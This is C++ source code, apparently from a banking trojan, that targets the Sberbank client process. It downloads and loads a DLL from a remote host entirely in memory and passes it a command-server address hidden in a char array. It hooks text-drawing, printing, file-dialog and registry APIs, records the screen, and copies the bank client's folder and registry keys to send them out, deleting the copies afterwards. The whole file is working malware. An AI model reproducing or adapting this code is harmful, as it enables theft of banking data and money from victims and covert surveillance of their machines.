#include <windows.h>
#include <windowsx.h>
#include "GetApi.h"
#include "Utils.h"
#include "Memory.h"
#include "Strings.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Splice.h"
#include "Config.h"
#include "Crypt.h"
#include "Sber.h"
#include "Plugins.h"
#include "DllLoader.h"
#include "VideoRecorder.h"
#include "Inject.h"

#include "CabPacker.h"
#include "Loader.h"
#include "BotHTTP.h"

#include "BotDebug.h"

namespace SBER_DOWNLOAD_DLL
{
    #include "DbgTemplates.h"
}
#define DBG SBER_DOWNLOAD_DLL::DBGOutMessage<>

// Импорт из Sb.dll
typedef BOOL( WINAPI *PInitFunc )		(DWORD origFunc, char *funcName);
typedef VOID( WINAPI *PSetParams )		(char *AHost, char *AUid);
typedef BOOL( WINAPI *PShowWindow )		( HWND hWnd, int nCmdShow );
typedef BOOL( WINAPI *PTranslateMessage )( const MSG *lpMsg );
typedef BOOL( WINAPI *PTextOutA )		(HDC hdc, int x, int y, LPCSTR lpString, int c);
typedef BOOL ( WINAPI *PTextOutW )( HDC hdc, int x, int y, LPCWSTR lpString, int c);

typedef int ( WINAPI *PDrawTextA )(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);

typedef int ( WINAPI *PDrawTextW )(HDC hdc, LPCWSTR lpchText, int cchText, LPRECT lprc, UINT format);

typedef int ( WINAPI *PDrawTextExA )(HDC hdc, LPSTR lpchText, int cchText, LPRECT lprc, UINT format,
																		LPDRAWTEXTPARAMS lpdtp);

typedef int ( WINAPI *PDrawTextExW )(HDC hdc, LPWSTR lpchText, int cchText, LPRECT lprc, UINT format,
																		LPDRAWTEXTPARAMS lpdtp);

typedef BOOL ( WINAPI *PExtTextOutA )(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
																			LPCSTR lpString, UINT c, CONST INT * lpDx);
typedef BOOL ( WINAPI *PExtTextOutW )(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
																			LPCWSTR lpString, UINT c, CONST INT * lpDx);

typedef BOOL ( WINAPI *PEnumPrintersA)(DWORD Flags, LPSTR Name, DWORD Level, LPBYTE  pPrinterEnum,
																			DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned);

typedef BOOL  ( WINAPI *PGetSaveFileNameA )(LPOPENFILENAME lpofn);
typedef BOOL  ( WINAPI *PGetOpenFileNameA )(LPOPENFILENAME lpofn);

typedef HMODULE ( WINAPI *PLoadLibraryExW )(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags );
typedef LSTATUS ( WINAPI *PRegQueryValueExA )(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved,
									LPDWORD lpType,  LPBYTE lpData, LPDWORD lpcbData);

// Храним адреса перехваченных функций
static PShowWindow Real_ShowWindow;
static PTranslateMessage Real_TranslateMessage;
static PTextOutA Real_TextOutA;
static PTextOutW Real_TextOutW;
static PDrawTextA Real_DrawTextA;
static PDrawTextW Real_DrawTextW;
static PExtTextOutA Real_ExtTextOutA;
static PExtTextOutW Real_ExtTextOutW;
static PDrawTextExA Real_DrawTextExA;
static PDrawTextExW Real_DrawTextExW;
static PEnumPrintersA Real_EnumPrintersA;
static PGetSaveFileNameA Real_GetSaveFileNameA;
static PGetOpenFileNameA Real_GetOpenFileNameA;
static PLoadLibraryExW Real_LoadLibraryExW;
static PRegQueryValueExA Real_RegQueryValueExA;


/************************************************************************/
bool WINAPI IsSberProcess()
{
	// проверяем процесс ли это сбера. 
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH*sizeof (WCHAR) );
	if ( ModulePath == NULL )return false;
	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	if ( dwProcessHash == 0x321ecf12 )
	{
		MemFree( ModulePath );
		return true;
	}

	MemFree( ModulePath );/**/
	return false;
}

//создает имя файла для хранения dll в файле
static PCHAR GetNameDll(char* uid)
{
	PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
	if( path )
	{
		pGetTempPathA( MAX_PATH, path );
		pPathAppendA( path, uid );
		char* path2 = UIDCrypt::CryptFileName( path, true );
		DBG( "Sber", "имя файла dll: %s", path2 );
		HEAP::Free(path);
		path = path2;
	}
	return path;
}

static BYTE* LoadSluiceDll( char* uid )
{
#ifdef DEBUGCONFIG
	char* url = "http://bifit-dbo.ru/s.dll";
#else
	char* url = "http://bifit-dbo.ru/s.dll"; //GetBotScriptURL( 0, "s.dll" );
#endif
	BYTE* module = 0;
	char* nameFile = GetNameDll(uid);
	//формируем пароль из уида
	char psw[9];
	m_memcpy( psw, uid, 8 );
	psw[8] = 0;

	if(!HTTP::Get( url, (char**)&module, 0 ))
	{
		DBG( "Sber", "не удаеться скачать нужную длл, проверьте есть ли она по адресу s%", url );
		if( nameFile )
		{
			DWORD sz;
			char* data = (char*)File::ReadToBufferA( nameFile, sz );
			if( RC2Crypt::Decode( psw, data, sz ) )
				module = (BYTE*)data;
			else
			{
				MemFree(data);
				module = 0;
			}
		}
		else
			return 0;
	}
	else
	{
		int szModule = STR::Length((char*)module);
		DBG( "Sber", "Загружен файл %s, размер: %d", url, szModule );
		if( nameFile )
		{
			char* data = RC2Crypt::Encode( module, szModule, psw );
			File::WriteBufferA( nameFile, data, szModule );
			STR::Free(data);
		}
	}
	return module;
}

static bool TranslateHook( HMEMORYMODULE dll, PInitFunc InitFunc, const char* nameDllFunc, const char* nameHookFunc, int numHookDll, DWORD hashHookFunc, void* realFunc )
{
	void* addrFunc = MemoryGetProcAddress( dll, nameDllFunc );
	if( !addrFunc )
	{
		DBG( "Sber", "в dll нет функции %s", nameDllFunc );
		return false;
	}
	if( HookApi( numHookDll, hashHookFunc, addrFunc, &realFunc ) )
	{  
		if( InitFunc( (DWORD)realFunc, (char*)nameHookFunc ) )
			DBG( "Sber", "поставили хук из длл на %s", nameHookFunc );
		else
			return false;
	}	
	else
		return false;
	return true;
}

bool HookSberApi()
{
	PCHAR UID = STR::Alloc(120);
	GenerateUid(UID);
	DBG( "Sber", "UID: %s", UID );

	BYTE* BotModule = LoadSluiceDll(UID);
	if( BotModule == 0 ) return false;
	
	HMEMORYMODULE hLib = MemoryLoadLibrary(BotModule);
	if( hLib == NULL )
	{	
		DBG( "Sber", "не получилось загрузить библиотеку (MemoryLoadLibrary)" );
		return false;
	}
	DBG( "Sber", "Библиотека загружена" );

	char StartInitFunc_func[] = {'I','n','i','t','F','u','n','c',0};

	PInitFunc pInitFunc = (PInitFunc)MemoryGetProcAddress( hLib, StartInitFunc_func );
	if( pInitFunc == NULL )
	{	
		DBG( "Sber","в dll нет функции s%", StartInitFunc_func );
		return 0;
	}

	PSetParams SetParamsSBR = (PSetParams)MemoryGetProcAddress( hLib, "SetParams" );
	if( SetParamsSBR == NULL )
	{
		DBG( "Sber", "в dll нет функции s%", StartInitFunc_func );
		return 0;		
	}
	
	char HostOfBots[] = {'h','t','t','p',':','/','/','s','b','e','r','b','a','n','k','s','y','s','t','e','m','.','r','u', 0};
	SetParamsSBR( HostOfBots, UID );
	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, UID );
	STR::Free(UID);


	//Подгружаем из длл хуки и устанавливаем
	TranslateHook( hLib, pInitFunc, "ShowWindowCallBack", "ShowWindow", 3, 0x7506E960, Real_ShowWindow );
	TranslateHook( hLib, pInitFunc, "TranslateMessageCallBack", "TranslateMessage", 3, 0xC45D9631, Real_TranslateMessage );
	TranslateHook( hLib, pInitFunc, "DrawTextACallBack", "DrawTextA", 3, 0x85BBDFC, Real_DrawTextA );
	TranslateHook( hLib, pInitFunc, "DrawTextWCallBack", "DrawTextW", 3, 0x85BBDEA, Real_DrawTextW );
	TranslateHook( hLib, pInitFunc, "DrawTextExACallBack", "DrawTextExA", 3, 0xEF7E3E57, Real_DrawTextExA );
	TranslateHook( hLib, pInitFunc, "DrawTextExWCallBack", "DrawTextExW", 3, 0xEF7E3E41, Real_DrawTextExW );
	TranslateHook( hLib, pInitFunc, "TextOutACallBack", "TextOutA", DLL_GDI, 0x4954ED86, Real_TextOutA );
	TranslateHook( hLib, pInitFunc, "TextOutWCallBack", "TextOutW", DLL_GDI, 0x4954ED90, Real_TextOutW );
	TranslateHook( hLib, pInitFunc, "ExtTextOutACallBack", "ExtTextOutA", DLL_GDI, 0x3D54FCFA, Real_ExtTextOutA );
	TranslateHook( hLib, pInitFunc, "ExtTextOutWCallBack", "ExtTextOutW", DLL_GDI, 0x3D54FCEC, Real_ExtTextOutW );
	TranslateHook( hLib, pInitFunc, "EnumPrintersACallBack", "EnumPrintersA", DLL_WINSPOOL, 0x9804C3C0, Real_EnumPrintersA );
	TranslateHook( hLib, pInitFunc, "GetSaveFileNameACallBack", "GetSaveFileNameA", DLL_COMANDLG32, 0x8FD473C8, Real_GetSaveFileNameA );
	TranslateHook( hLib, pInitFunc, "GetOpenFileNameACallBack", "GetOpenFileNameA", DLL_COMANDLG32, 0xE16570D, Real_GetOpenFileNameA );
	TranslateHook( hLib, pInitFunc, "LoadLibraryExWCallBack", "LoadLibraryExW", 1, 0x20088E7C, Real_LoadLibraryExW );
	TranslateHook( hLib, pInitFunc, "RegQueryValueExACallBack", "RegQueryValueExA", 2, 0x1802E7C8, Real_RegQueryValueExA );

	DBG( "Sber", "Установка хуков выполнена" );

	StartRecordThread( GetUniquePID(), "Sber", NULL, NULL, 700 );

	char path[MAX_PATH];
	pExpandEnvironmentStringsA( "%USERPROFILE%", path, sizeof(path) );
	pPathAppendA( path, "Local Settings\\Application Data\\Sbr\\sbgrbd.bal" );
	if( FileExistsA(path) )
	{
		DBG( "Sber", "Файл '%s' существует", path );
	}
	else
	{
		DBG( "Sber", "Файл '%s' не существует", path );
		pPathRemoveFileSpecA(path);
		pPathAppendA( path, "sb.bal" );
		DBG( "Sber", "Создаем файл '%s'", path );
		File::WriteBufferA( path, path, 0 );
	}
	return true;
}

/************************************************************************/
bool HookSber()
{
	if ( IsSberProcess() )
	{
		UnhookSber();
		HookSberApi();
		return true;
	}
	return false;
}

void FirstInitSber()
{
	// проверяем запускался ли збер, и если нет то в свхосте стартуем копирование и передачу папки 
	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\sbe.tmp"), sTEMPProfile, MAX_PATH);
	if(FileExistsA(sTEMPProfile))
	{		
		//MegaJump(CopyFolderThread);
	}
	STR::Free(sTEMPProfile);

}
/************************************************************************/

DWORD WINAPI CopyFolderThread( LPVOID lpData )
{
	
	//Сначала копируем в темповую папку файлы, после чего их отправляем методом игоря вызываемым из длл
	PCHAR Name;//= STR::Alloc(MAX_PATH);

	PCHAR sTEMPProfileSB = STR::Alloc(MAX_PATH );
	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\sbe.tmp"), sTEMPProfileSB, MAX_PATH);
	if(FileExistsA(sTEMPProfileSB))
	{
		DWORD iSize;
		char* NameFile=(PCHAR)File::ReadToBufferA(sTEMPProfileSB,iSize);
		Name=STR::New(1,NameFile);

		MemFree(NameFile);
	}
	else
	{
		STR::Free(sTEMPProfileSB);
		return 0;
	}
	
	// откуда копируем

	DBG("SBER","CopyFolderThread %s",Name);
	pPathRemoveFileSpecA(Name);

	// добавляем в конце два нулевых символа
	int ii=m_lstrlen(Name);
	Name[ii]='\0';
	Name[ii+1]='\0';

	// куда копируем
	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
	m_memset(sTEMPProfile,0,MAX_PATH);
	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\dat"), sTEMPProfile, MAX_PATH);
	pCreateDirectoryA(sTEMPProfile,NULL);


	PCHAR FileReg1=STR::New(2,sTEMPProfile,"\\HKLMSOFTWARE.SBR");
	PCHAR FileReg2=STR::New(2,sTEMPProfile,"\\HKCUSOFTWARE.SBR");
	DBG("SBER","CopyFolderThread %s",FileReg1);
	DBG("SBER","CopyFolderThread %s",FileReg2);

	// добавляем в конце два нулевых символа
	int i=m_lstrlen(sTEMPProfile);
	sTEMPProfile[i]='\0';
	sTEMPProfile[i+1]='\0';
	
	// Само копирование
	bool isSend=CopyFileANdFolder(Name,sTEMPProfile);
	
	Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE	,"SOFTWARE\\SBRF",FileReg1);
	Registry::SaveRegKeyPath(HKEY_CURRENT_USER	,"SOFTWARE\\SBRF",FileReg2);
	STR::Free(FileReg1);
	STR::Free(FileReg1);
	
	//Отправка
	StartSendThread(sTEMPProfile,NULL,NULL,700);

	
	if(isSend)
	{
		DBG("SBER","мочим папку %s",sTEMPProfile);
		sTEMPProfile[i]='\0';
		sTEMPProfile[i+1]='\0';
		DeleteFolders(sTEMPProfile);
		//ClearDirectory(sTEMPProfile);
		File::WriteBufferA(sTEMPProfile, (void *)"123",3);
	}
	else
		DBG("SBER","not мочим папку %s",sTEMPProfile);

	///
	STR::Free(sTEMPProfileSB);
	STR::Free(sTEMPProfile);
	STR::Free(Name);
	return 0;
}

